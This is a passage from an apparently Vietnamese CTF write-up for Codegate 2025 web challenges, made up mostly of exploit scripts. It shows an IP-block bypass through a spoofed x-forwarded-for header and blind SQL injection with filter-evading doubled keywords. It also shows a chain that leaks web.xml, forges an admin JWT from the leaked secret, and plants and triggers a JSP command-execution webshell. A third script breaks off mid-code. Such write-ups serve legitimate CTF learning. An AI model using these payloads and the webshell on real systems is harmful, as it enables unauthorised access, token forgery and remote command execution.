            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
            <span class="k">return</span> <span class="nx">NextResponse</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="sb">`Failed to fetch the URL. Status: </span><span class="si">${</span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="si">}</span><span class="sb">`</span> <span class="p">},</span> <span class="p">{</span> <span class="nx">status</span>: <span class="kt">500</span> <span class="p">});</span>
        <span class="p">}</span>

        <span class="nx">blockedIPs</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">ip</span><span class="p">);</span>
        <span class="nx">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">blockedIPs</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">ip</span><span class="p">),</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">);</span>

        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`IP </span><span class="si">${</span><span class="nx">ip</span><span class="si">}</span><span class="sb"> Blocked`</span><span class="p">);</span>

        <span class="k">return</span> <span class="nx">NextResponse</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Sended!&#34;</span> <span class="p">},</span> <span class="p">{</span> <span class="nx">status</span>: <span class="kt">200</span> <span class="p">});</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">error</span> <span class="k">instanceof</span> <span class="nb">Error</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">NextResponse</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="sb">`An error occurred while fetching. Error message: </span><span class="si">${</span><span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="si">}</span><span class="sb">`</span> <span class="p">},</span> <span class="p">{</span> <span class="nx">status</span>: <span class="kt">500</span> <span class="p">});</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">NextResponse</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="sb">`An unexpected error occurred.`</span> <span class="p">},</span> <span class="p">{</span> <span class="nx">status</span>: <span class="kt">500</span> <span class="p">});</span>
        <span class="p">}</span>
    <span class="p">};</span>
<span class="p">}</span>
</code></pre></div><p>ở đây ta sẽ dùng đến cách brute force để có thể tìm port của internal service đang chạy và với cơ chế block ip một vài phút, nhưng mà ip chỉ check block chỉ lấy ở header client cho nên ta có thể bypass được bằng cách random ip header: <code>x-forwarded-for</code></p>
<p>Sau khi brute thì check thấy có port <code>808</code> là chạy của host internal service</p>
<p>Sau đó brute với bug của nextjs thì ra login sau đó sqli thì thấy có blind sql injection</p>
<p>ở đây có một fire đơn giản là nó sẽ replace những cái chuỗi như là <code>&quot;admadminin' anandd lenlengthgth(passwopasswordorrd)</code> <code>admin</code>, <code>length</code>, <code>password</code> cho nên ta sẽ dùng bypass đơn giản như sau:</p>
<p><strong>Code exploit</strong>:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">
<span class="c1"># exploit.py</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">server</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">argparse</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&#34;Ip&#34;</span><span class="p">)</span>
<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;-i&#34;</span><span class="p">,</span> <span class="s2">&#34;--ip&#34;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;IP challenge&#34;</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">run_server</span><span class="p">():</span>
    <span class="n">server</span><span class="o">.</span><span class="n">start_server</span><span class="p">()</span>

<span class="n">server_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">run_server</span><span class="p">)</span>
<span class="n">server_thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
<span class="n">server_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># url = &#39;http://192.168.200.100:3000/&#39;</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;http://{args.ip}:3000/&#34;</span>
<span class="n">local_ip</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>    <span class="c1"># Enter Local Server Ip</span>
<span class="n">local_port</span> <span class="o">=</span> <span class="mi">5000</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;Host&#39;</span><span class="p">:</span> <span class="n">f</span><span class="s1">&#39;{local_ip}:{local_port}&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;text/plaintext;charset=UTF-8&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Next-Action&#39;</span><span class="p">:</span> <span class="s1">&#39;6e6feac6ad1fb92892925b4e3766928a754aec71&#39;</span><span class="p">,</span>  <span class="c1"># Next-Action is fluid value.</span>
    <span class="s1">&#39;Next-Router-State-Tree&#39;</span><span class="p">:</span> <span class="s1">&#39;%5B</span><span class="si">%22%</span><span class="s1">22%2C%7B</span><span class="si">%22c</span><span class="s1">hildren</span><span class="si">%22%</span><span class="s1">3A%5B%22__PAGE__</span><span class="si">%22%</span><span class="s1">2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Origin&#39;</span><span class="p">:</span> <span class="n">f</span><span class="s1">&#39;http://{local_ip}:{local_port}&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="n">url</span>
<span class="p">}</span>

<span class="n">length</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">hex_chars</span> <span class="o">=</span> <span class="s2">&#34;0123456789abcdef{}&#34;</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;codegate2025&#34;</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[+] Trying Length : {i}&#34;</span><span class="p">)</span>
    <span class="n">server</span><span class="o">.</span><span class="n">update_username</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;admadminin&#39; anandd lenlengthgth(passwopasswordorrd)={i}#&#34;</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s1">&#39;[]&#39;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">if</span> <span class="s2">&#34;Welcome&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[+] Password Length : {i}&#34;</span><span class="p">)</span>
        <span class="n">length</span> <span class="o">=</span> <span class="n">i</span>
        <span class="k">break</span>

    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">length</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">hex_chars</span><span class="p">:</span>
        <span class="n">server</span><span class="o">.</span><span class="n">update_username</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;adadminmin&#39; anandd subsubstrstr(passwopasswordorrd, {i}, 1)=&#39;{c}&#39;#&#34;</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s1">&#39;[]&#39;</span><span class="p">)</span>
        <span class="k">if</span> <span class="s2">&#34;Welcome&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[+] Flag : {flag}&#34;</span><span class="p">)</span>
            <span class="k">break</span>

        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
</code></pre></div><p><img src="https://hackmd.io/_uploads/BJT3_so61l.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1ns8njake.png" alt="image"></p>
<h2 id="memo-service">Memo service</h2>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">jwt</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="c1"># host = &#34;http://43.202.252.195:8080&#34;</span>
<span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8081&#34;</span>

<span class="k">def</span> <span class="nf">user_register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&#34;/user/register.action&#34;</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
    <span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">user_login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&#34;/user/login.action&#34;</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">memo_write</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&#34;/memo/write.action&#34;</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="n">title</span><span class="p">,</span> <span class="s2">&#34;content&#34;</span><span class="p">:</span> <span class="n">content</span><span class="p">}</span>
    <span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">memo_list</span><span class="p">(</span><span class="n">cookies</span><span class="p">):</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&#34;/memo/list.action&#34;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">memo_read</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="nb">id</span><span class="p">):</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="n">f</span><span class="s2">&#34;/memo/read.action?id={id}&#34;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">memo_download</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="n">owner</span><span class="p">,</span> <span class="nb">id</span><span class="p">):</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="n">f</span><span class="s2">&#34;/memo/download.action?id={id}&amp;owner={owner}&#34;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">file_leak</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>

    <span class="n">title</span> <span class="o">=</span> <span class="s2">&#34;file leak&#34;</span>
    <span class="c1"># Sitemesh: HTMLPageParser -&gt; PageDecoratorMapper -&gt; FileDecoratorMapper</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;&lt;/scriptx&gt;&lt;meta name=decorator content={filename}&gt;&#34;</span>
    <span class="n">memo_write</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

    <span class="nb">list</span> <span class="o">=</span> <span class="n">memo_list</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;location.href=&#39;/memo/read\.action\?id=(\d+)&#39;&#34;</span><span class="p">)</span>
    <span class="n">last_memo_id</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="nb">list</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

    <span class="n">memo</span> <span class="o">=</span> <span class="n">memo_read</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="n">last_memo_id</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">memo</span>

<span class="k">def</span> <span class="nf">webshell_create</span><span class="p">(</span><span class="n">user_cookies</span><span class="p">,</span> <span class="n">admin_cookies</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>

    <span class="n">memo_write</span><span class="p">(</span><span class="n">user_cookies</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

    <span class="nb">list</span> <span class="o">=</span> <span class="n">memo_list</span><span class="p">(</span><span class="n">user_cookies</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;location.href=&#39;/memo/read\.action\?id=(\d+)&#39;&#34;</span><span class="p">)</span>
    <span class="n">memo_id</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="nb">list</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

    <span class="n">memo</span> <span class="o">=</span> <span class="n">memo_read</span><span class="p">(</span><span class="n">user_cookies</span><span class="p">,</span> <span class="n">memo_id</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s1">&#39;&lt;!-- (\d+) --&gt;&#39;</span><span class="p">)</span>
    <span class="n">memo_owner</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">memo</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

    <span class="c1"># Create file -&gt; /download/memo_{owner}_{id}.csv</span>
    <span class="n">memo_download</span><span class="p">(</span><span class="n">admin_cookies</span><span class="p">,</span> <span class="n">memo_owner</span><span class="p">,</span> <span class="n">memo_id</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">f</span><span class="s2">&#34;/download/memo_{memo_owner}_{memo_id}.csv&#34;</span>

<span class="k">def</span> <span class="nf">webshell_trigger</span><span class="p">(</span><span class="n">webshell_filepath</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>

    <span class="c1"># AuthFilter JWT -&gt; request.setAttribute</span>
    <span class="c1"># JspServlet jspUri = (String) request.getAttribute(RequestDispatcher.INCLUDE_SERVLET_PATH);</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;sub&#34;</span><span class="p">:</span> <span class="s2">&#34;user&#34;</span><span class="p">,</span> <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;hacker&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;javax.servlet.include.servlet_path&#34;</span><span class="p">:</span> <span class="n">webshell_filepath</span><span class="p">}</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">&#34;HS256&#34;</span><span class="p">)</span>
    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">token</span><span class="p">}</span>

    <span class="c1"># Call JspServlet with AuthFilter</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="n">f</span><span class="s2">&#34;/memo/what_the_hack.jsp?cmd={command}&#34;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&lt;&lt;&lt;(.*?)&gt;&gt;&gt;&#34;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>

    <span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;nganganga_&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">())</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">username</span>
    <span class="n">user_register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
    <span class="n">user_cookies</span> <span class="o">=</span> <span class="n">user_login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>

    <span class="c1"># Leak /WEB-INF/web.xml</span>
    <span class="n">web_xml</span> <span class="o">=</span> <span class="n">file_leak</span><span class="p">(</span><span class="n">user_cookies</span><span class="p">,</span> <span class="s2">&#34;/WEB-INF/web.xml&#34;</span><span class="p">)</span>

    <span class="c1"># Parse SECRET_KEY</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&lt;param-value&gt;(.*?)&lt;/param-value&gt;&#34;</span><span class="p">)</span>
    <span class="n">secret_key</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">web_xml</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

    <span class="c1"># Create admin token</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;sub&#34;</span><span class="p">:</span> <span class="s2">&#34;user&#34;</span><span class="p">,</span> <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">&#34;HS256&#34;</span><span class="p">)</span>
    <span class="n">admin_cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">token</span><span class="p">}</span>

    <span class="c1"># Create webshell file</span>
    <span class="n">title</span> <span class="o">=</span> <span class="s2">&#34;webshell&#34;</span>
    <span class="n">content</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;%@ page import=&#34;java.util.*,java.io.*&#34;%&gt;
</span><span class="s2">    &lt;%
</span><span class="s2">    if (request.getParameter(&#34;cmd&#34;) != null) {
</span><span class="s2">            out.println(&#34;Command: &#34; + request.getParameter(&#34;cmd&#34;) + &#34;&lt;BR&gt;&#34;);
</span><span class="s2">            Process p = Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;));
</span><span class="s2">            OutputStream os = p.getOutputStream();
</span><span class="s2">            InputStream in = p.getInputStream();
</span><span class="s2">            DataInputStream dis = new DataInputStream(in);
</span><span class="s2">            String disr = dis.readLine();
</span><span class="s2">            while ( disr != null ) {
</span><span class="s2">                    out.println(&#34;&lt;&lt;&lt;&#34; + disr + &#34;&gt;&gt;&gt;&#34;); 
</span><span class="s2">                    disr = dis.readLine(); 
</span><span class="s2">                    }
</span><span class="s2">            }
</span><span class="s2">    %&gt;&#34;&#34;&#34;</span>
    <span class="n">webshell_filepath</span> <span class="o">=</span> <span class="n">webshell_create</span><span class="p">(</span><span class="n">user_cookies</span><span class="p">,</span> <span class="n">admin_cookies</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

    <span class="c1"># Trigger webshell</span>
    <span class="n">webshell_trigger</span><span class="p">(</span><span class="n">webshell_filepath</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>

    <span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;/readflag&#34;</span>
    <span class="n">exploit</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
</code></pre></div><h2 id="back-office">back office</h2>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">Session</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">import</span> <span class="nn">jwt</span>
<span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="n">AUTHORIZATION</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>

<span class="k">def</span> <span class="nf">file_download</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="n">Session</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">AUTHORIZATION</span>

    <span class="c1"># qna create</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
        <span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/api/v1/user/qna&#34;</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="n">f</span><span class="s2">&#34;bearer {AUTHORIZATION}&#34;</span><span class="p">},</span>
        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="s2">&#34;azxczxcazxczxc&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;2asdasdzazxczxc&#34;</span><span class="p">,</span> <span class="s2">&#34;content&#34;</span><span class="p">:</span> <span class="s2">&#34;azxczxc&#34;</span><span class="p">},</span>
        <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;qna_file&#34;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.png&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)}</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">&gt;=</span> <span class="mi">400</span><span class="p">:</span>
        <span class="nb">exit</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;qna generate failed: {resp.status_code} {resp.text}&#39;</span><span class="p">)</span>

    <span class="c1"># get qna id</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
        <span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/api/v1/user/qna&#34;</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="n">f</span><span class="s2">&#34;bearer {AUTHORIZATION}&#34;</span><span class="p">}</span>
    <span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
    <span class="n">qna_id</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">qna_filename</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">data</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;data&#39;</span><span class="p">]):</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;file_name&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;N&#34;</span><span class="p">):</span>
            <span class="n">qna_id</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
            <span class="n">qna_filename</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;file_name&#39;</span><span class="p">]</span>

    <span class="c1"># get file</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
        <span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/api/v1/user/qna/file&#34;</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="n">f</span><span class="s2">&#34;bearer {AUTHORIZATION}&#34;</span><span class="p">},</span>
        <span class="n">json</span><span class="o">=</span><span class="p">{</span>
            <span class="s2">&#34;qna_id&#34;</span><span class="p">:</span> <span class="n">f</span><span class="s2">&#34;{qna_id}&#34;</span><span class="p">,</span>
            <span class="s2">&#34;dwn_policy&#34;</span><span class="p">:</span> <span class="s2">&#34;TEXT_DOWN&#34;</span><span class="p">,</span>
